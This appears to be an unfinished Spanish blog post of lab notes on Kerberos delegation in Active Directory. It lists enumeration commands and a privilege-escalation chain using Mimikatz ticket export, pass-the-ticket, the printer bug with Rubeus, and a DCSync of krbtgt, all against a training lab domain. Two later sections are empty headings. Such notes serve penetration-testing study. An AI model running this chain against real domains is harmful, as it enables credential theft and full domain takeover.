---
layout: post
title: KERBEROS DELEGATION 
date: 19.03.2025
categories: [Active Directory, Windows, Kerberos, Authentication]
tag: [Windows, AD, Active Directory, Authentication Protocol, Delegation, Constrained Delegation, Unconstrained Delegation, RBCD, Resource Based Constrained Delegation, SSO, Single Sign On]
---

# ¿Que es KERBEROS?
Kerberos es el protocolo de auntentiación que utiliza Active Directory por defecto y permite características como Single Sign On (SSO).

![Imagen Kerberos](https://www.tarlogic.com/wp-content/uploads/2019/03/kerberosI-1200x900.png){width='75px'}

```console powershell

# Discover domain computers which have unconstrained delegation enabled using PowerView:
Get-DomainComputer -UnConstrained    #(Cuando ejecutamos este comando siempre nos devolverá como resultado también al DOMAIN CONTROLLER (Ej: DCORP-DC$) pero tenemos que ignorar ese OUTPUT)

Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}


#########################################################################

# Enumerate users and computers with constrained delegation enabled

# Using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo


#########################################################################

# RBCD ENUMERATION:
Get-DomainRBCD 

# We already have admin privileges on student VMs that are domain joined machines.

# Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}


# Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

# UNCONSTRAINED DELEGATION

```console powershell
################################################################################
############## UNCONSTRAINED DELEGATION - Privilege Escalation #################
################################################################################

# Discover domain computers which have unconstrained delegation enabled using PowerView:
Get-DomainComputer -UnConstrained    #(Cuando ejecutamos este comando siempre nos devolverá como resultado también al DOMAIN CONTROLLER (Ej: DCORP-DC$) pero tenemos que ignorar ese OUTPUT)

Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}



# Compromise the server(s) where Unconstrained delegation is enabled.
# We must trick or wait for a domain admin to connect a service on appsrv.
# Now, if the command is run again:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# The DA token could be reused:
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'


###############################################################################
################## PRINTER BUG - Unconstrained Delegation #####################
###############################################################################

# We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
Rubeus.exe monitor /interval:5 /nowrap

# And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local


#Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
Rubeus.exe ptt /tikcet:

# Once the ticket is injected, run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

```

# CONSTRAINED DELEGATION






# RESOURCE BASED CONSTRAINED DELEGATION - RBCD


### HOLA!

ok